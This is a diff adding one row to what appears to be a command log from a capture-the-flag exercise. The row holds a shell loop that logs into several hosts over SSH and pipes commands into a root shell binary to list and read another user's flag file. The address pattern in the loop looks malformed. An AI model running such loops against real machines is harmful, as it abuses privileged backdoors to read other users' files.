@@ -1,0 +1,2 @@
+docker_id;generation;full_time;service;command
+45a59c70-d969-4e28-aeb2-11c6bd16ca73;2;2025-10-19 10:45:11;-1;for i in {11..19}; do ssh -p2222 ot-user@10.0.0$i 'echo "ls -la /home/ot-admin/; cat /home/ot-admin/flag.txt" | /bin/rootshell/myShell'; done
